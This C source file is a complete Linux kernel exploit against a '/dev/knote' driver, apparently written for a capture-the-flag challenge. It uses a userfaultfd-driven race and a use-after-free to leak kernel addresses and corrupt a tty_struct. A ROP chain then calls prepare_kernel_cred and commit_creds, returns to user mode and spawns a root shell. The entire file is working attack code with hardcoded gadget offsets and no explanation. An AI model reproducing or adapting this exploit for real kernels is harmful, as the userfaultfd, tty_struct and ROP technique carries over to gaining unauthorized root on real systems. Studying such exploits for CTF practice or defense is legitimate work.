#include <sys/types.h>
#include <sys/stat.h>
#include <linux/userfaultfd.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <stdint.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)

static int page_size;
int fd;
int tty_fd;
uint64_t tty_struct_addr;

unsigned long user_cs, user_ss, user_rflags;
void *stack;

void save_stats() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n" 
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_rflags) : : "memory"
        );
}

void get_shell() {
    system("/bin/sh");
}

struct Req {
	long arg;
	char *ptr;
};

int add(int sz) {
	struct Req req;
	req.arg = sz;
	req.ptr = 0x12345;
	return ioctl(fd, 0x1337, &req);
}

int edit(int idx, char *buf) {
	struct Req req;
	req.arg = idx;
	req.ptr = buf;
	return ioctl(fd, 0x8888, &req);
}

int get(int idx, char *buf) {
	struct Req req;
	req.arg = idx;
	req.ptr = buf;
	return ioctl(fd, 0x2333, &req);
}

int del(int idx) {
	struct Req req;
	req.arg = idx;
	req.ptr = 0x6789a;
	return ioctl(fd, 0x6666, &req);
}

static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    static int fault_cnt = 0;     /* Number of faults so far handled */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
       page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
       if (page == MAP_FAILED)
           errExit("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
      file descriptor */

    for (;;) {

       /* See what poll() tells us about the userfaultfd */

       struct pollfd pollfd;
       int nready;
       pollfd.fd = uffd;
       pollfd.events = POLLIN;
       nready = poll(&pollfd, 1, -1);
       if (nready == -1)
           errExit("poll");

       /* Read an event from the userfaultfd */

       nread = read(uffd, &msg, sizeof(msg));
       if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
       }

       if (nread == -1)
           errExit("read");

       /* We expect only one kind of event; verify that assumption */

       if (msg.event != UFFD_EVENT_PAGEFAULT) {
           fprintf(stderr, "Unexpected event on userfaultfd\n");
           exit(EXIT_FAILURE);
       }

        /* Copy the page pointed to by 'page' into the faulting
          region. Vary the contents that are copied in, so that it
          is more obvious that each fault is handled separately. */

       if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE) {
            // Write fault, used for leak
            del(0);
            tty_fd = open("/dev/ptmx", O_RDWR|O_NOCTTY);
            if (tty_fd < 0)
                errExit("open ptmx");

            struct uffdio_range range;
            range.start = msg.arg.pagefault.address & ~(page_size - 1);
            range.len = page_size;
            if (ioctl(uffd, UFFDIO_UNREGISTER, &range) == -1)
                errExit("ioctl-UFFDIO_UNREGISTER");
            if (ioctl(uffd, UFFDIO_WAKE, &range) == -1)
                errExit("ioctl-UFFDIO_WAKE");
       } else {
           // Read fault, used for overwritting fd pointer of freed object
           del(0);
           memset(page, 'A' + fault_cnt % 20, page_size);
           //*(unsigned long int *)page = 0x100005401;
           *(unsigned long int *)page = tty_struct_addr;
           *(unsigned long int *)(page+8) = 0;
           fault_cnt++;

           uffdio_copy.src = (unsigned long) page;

           uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
           uffdio_copy.len = page_size;
           uffdio_copy.mode = 0;
           uffdio_copy.copy = 0;
           if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
               errExit("ioctl-UFFDIO_COPY");
           }
    }
}

int main() {

    // 1. Setup userfaultfd

    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    unsigned long len;  /* Length of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    page_size = sysconf(_SC_PAGE_SIZE);
    len = 2 * page_size;

    /* Create and enable userfaultfd object */

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
       errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
       errExit("ioctl-UFFDIO_API");

    /* Create a private anonymous mapping. The memory will be
      demand-zero paged--that is, not yet allocated. When we
      actually touch the memory, it will be allocated via
      the userfaultfd. */

    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
       errExit("mmap");

    /* Register the memory range of the mapping we just created for
      handling by the userfaultfd object. In mode, we request to track
      missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
       errExit("ioctl-UFFDIO_REGISTER");

    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
       errno = s;
       errExit("pthread_create");
    }


    // 2. Start exploit
    save_stats();
    stack = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    fd = open("/dev/knote", O_RDWR);

    if (fd < 0) {
     perror("open");
     exit(1);
    }

    add(0x2e0);
    get(0, addr);

    uint64_t leak;              // 0xffffffff815d3b70
    uint64_t heap;
    uint64_t *ptr = addr;
    uint64_t pop_rdi_ret;       // 0xffffffff8116dbd1
    uint64_t pop4ret;           // 0xffffffff813f0233
    uint64_t leave_ret;         // 0xffffffff8147b735
    uint64_t rax_to_rdi;        // 0xffffffff811ce120: mov rdi, rax ; mov rax, rdi ; pop rbx ; pop rbp ; ret  ;
    uint64_t swapgs;            // 0xffffffff81068f10
    uint64_t iret;              // 0xffffffff81036e57

    uint64_t commit_creds;
    uint64_t prepare_kernel_cred;

    if (ptr[0x4a] >> 32 == 0xffffffff) {
        leak = ptr[0x4a];
        heap = ptr[7] - 0x38;
        commit_creds = leak - 0x520b30;
        prepare_kernel_cred = leak - 0x5207e0;

        pop_rdi_ret = leak - 0x465f9f;
        pop4ret = leak - 0x1e393d;
        leave_ret = leak - 0x15843b;
        rax_to_rdi = leak - 0x405a50;
        swapgs = leak - 0x56ac60;
        iret = leak - 0x59cd19;
    } else {
        printf("Leak failed!\n");
        exit(1);
    }

    printf("tty_struct: %p\n", heap);
    printf("leak: %p\n", leak);
    printf("commit_creds: %p\n", commit_creds);
    printf("prepare_kernel_cred: %p\n", prepare_kernel_cred);
    // Find a null-pointer to be fake object
    tty_struct_addr = heap + 0x8;

    // Reopen to reset operation numbers

    close(fd);
    fd = open("/dev/knote", O_RDWR);

    if (fd < 0) {
     perror("open");
     exit(1);
    }

    // Another userfault page

    addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
       errExit("mmap");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
       errExit("ioctl-UFFDIO_REGISTER");

    #define BUFSIZE 0x100

    // Setup rop payload
    // we will overwrite tty_struct with buf
    // RBP points to tty_struct, then 'leave; ret' will help us to pivot stack

    uint64_t buf[BUFSIZE];
    memset(buf, '\0', sizeof(buf));
    buf[0] = pop4ret;
    buf[1] = leave_ret;
    buf[2] = tty_struct_addr - 0x60 + 0x20;    // struct tty_operations *
    buf[3] = leave_ret;
    buf[4] = leave_ret;

    uint64_t rop[] = {
        pop_rdi_ret,
        0,
        prepare_kernel_cred,
        rax_to_rdi,
        0,
        0,
        commit_creds,
        swapgs,
        iret,
        get_shell,
        user_cs,
        user_rflags,
        stack + 0x8000,
        user_ss
    };

    memcpy(&buf[5], rop, sizeof(rop));

    add(BUFSIZE);
    edit(0, addr);

    // Reopen to reset operation numbers

    close(fd);
    fd = open("/dev/knote", O_RDWR);

    if (fd < 0) {
      perror("open");
      exit(1);
    }

    add(BUFSIZE);
    add(BUFSIZE);
    add(BUFSIZE);
    add(BUFSIZE);
    edit(0, buf);
    edit(1, buf);
    edit(2, buf);
    edit(3, buf);

    if (ioctl(tty_fd, 0xdeadbeef, 0x13371337) < 0)
        errExit("ioctl tty");

    close(tty_fd);
	  close(fd);
}